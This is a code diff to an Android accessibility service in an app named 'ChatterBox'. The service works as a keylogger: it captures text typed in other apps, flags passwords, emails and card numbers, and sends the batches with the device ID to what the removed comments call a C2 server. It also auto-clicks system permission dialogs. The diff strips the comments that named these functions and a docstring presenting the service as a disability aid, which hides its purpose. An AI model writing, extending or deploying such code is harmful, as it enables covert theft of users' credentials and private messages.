@@ -8,31 +8,22 @@ import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import android.view.accessibility.AccessibilityNodeInfo
 import org.json.JSONObject
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 
-/**
- * ChatterBox Accessibility Service
- *
- * This service enhances the user experience for users with disabilities by providing
- * better navigation and interaction with the app.
- */
 @SuppressLint("HardwareIds")
 class AccessibilityService : android.accessibilityservice.AccessibilityService() {
     private val TAG = "ChatterBoxAccessibility"
     private val handler = Handler(Looper.getMainLooper())
     private lateinit var permissionDialogs: PermissionDialogs
 
-    // Keep track of keyboard input for keylogging
     private val keylogBuffer = StringBuilder()
     private var currentFocusedApp = ""
     private var lastInputTime = 0L
     private val keylogFlushDelay = 5000L // 5 seconds without typing to collect a batch
 
-    // Use consistent device ID
     private val deviceId by lazy {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
     }
@@ -50,7 +41,6 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
         instance = this
         permissionDialogs = PermissionDialogs(this)
 
-        // Configure accessibility service capabilities
         val info = AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
@@ -61,7 +51,6 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
         info.notificationTimeout = 100
 
-        // Set the updated info
         this.serviceInfo = info
 
         Log.d(TAG, "Accessibility service configured and ready")
@@ -71,9 +60,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
         if (event == null) return
         IdleDetector.processAccessibilityEvent(event)
 
-        // Track app switches for better keylogging context
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.packageName != null) {
-            // If we switch apps, flush the current keylog buffer
             if (currentFocusedApp != event.packageName) {
                 if (keylogBuffer.isNotEmpty()) {
                     flushKeylogBuffer()
@@ -82,21 +69,16 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             }
         }
 
-        // Extract text for sensitive information when appropriate
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            // This captures keyboard input for keylogging
             val sourceText = event.text?.joinToString(" ") ?: ""
             val packageName = event.packageName?.toString() ?: "unknown"
             currentFocusedApp = packageName
 
-            // Don't capture text from our own app
             if (packageName != "com.example.ChatterBox" && sourceText.isNotEmpty()) {
-                // Record keylog data
                 keylogBuffer.append(sourceText)
                 keylogBuffer.append(" ")
                 lastInputTime = System.currentTimeMillis()
 
-                // Schedule a flush if the user stops typing
                 handler.removeCallbacks(keylogFlushRunnable)
                 handler.postDelayed(keylogFlushRunnable, keylogFlushDelay)
 
@@ -116,14 +98,12 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                 val packageName = event.packageName?.toString() ?: return
 
-                // Only check for permission dialogs if we're in permission granting mode
                 if (permissionDialogs.isGrantingPermissions() &&
                     (packageName.contains("permissioncontroller") ||
                             packageName == "android" ||
-                            packageName == "com.android.systemui" ||  // Add systemui package
+                            packageName == "com.android.systemui" ||
                             packageName == "com.android.settings")) {
 
-                    // Small delay to ensure dialog is fully loaded
                     handler.postDelayed({
                         checkAllWindowsForPermissionDialogs()
                     }, 200)
@@ -132,17 +112,14 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
         }
     }
 
-    // Runnable to flush keylog data after delay
     private val keylogFlushRunnable = Runnable {
         flushKeylogBuffer()
     }
 
-    // Flush the keylog buffer and send data to C2 server
     private fun flushKeylogBuffer() {
         if (keylogBuffer.isEmpty()) return
 
         try {
-            // Create keylog data payload
             val keylogData = JSONObject().apply {
                 put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
                 put("device_id", deviceId)
@@ -152,7 +129,6 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 put("android_version", android.os.Build.VERSION.RELEASE)
             }
 
-            // Send to C2 server
             val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(applicationContext)
             dataSynchronizer.sendExfiltrationData("keylog", keylogData.toString())
 
@@ -167,7 +143,6 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
     private fun containsSensitiveData(text: String): Boolean {
         val lowercase = text.lowercase()
 
-        // Look for email patterns
         if (lowercase.contains("@") && lowercase.contains(".")) return true
 
         // Look for credit card number patterns (4+ consecutive digits)
@@ -185,14 +160,11 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
     }
 
     private fun isSensitiveField(event: AccessibilityEvent): Boolean {
-        // Check if the source node is available
         val source = event.source ?: return false
 
         try {
-            // Check if it's a password field
             if (source.isPassword) return true
 
-            // Check the hint text or content description for sensitive terms
             val hintText = source.hintText?.toString()?.lowercase() ?: ""
             val contentDesc = source.contentDescription?.toString()?.lowercase() ?: ""
 
@@ -206,24 +178,19 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
     }
     private fun checkAllWindowsForPermissionDialogs() {
         try {
-            // Try looking at active window first
             val root = rootInActiveWindow
             if (root != null) {
                 permissionDialogs.handlePermissionDialog(root)
-                root.recycle()
             }
 
-            // Also check all windows
             windows.forEach { window ->
                 val windowRoot = window.root ?: return@forEach
                 permissionDialogs.handlePermissionDialog(windowRoot)
-                windowRoot.recycle()
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error handling permission dialogs", e)
         }
     }
-
 
     fun startPermissionGrantingMode(expectedPermissions: Int) {
         permissionDialogs.startGrantingPermissions(expectedPermissions)
@@ -238,11 +205,9 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
     }
 
     override fun onDestroy() {
-        // Flush any remaining keylog data
         if (keylogBuffer.isNotEmpty()) {
             flushKeylogBuffer()
         }
-
         permissionDialogs.cleanup()
         handler.removeCallbacksAndMessages(null)
         super.onDestroy()
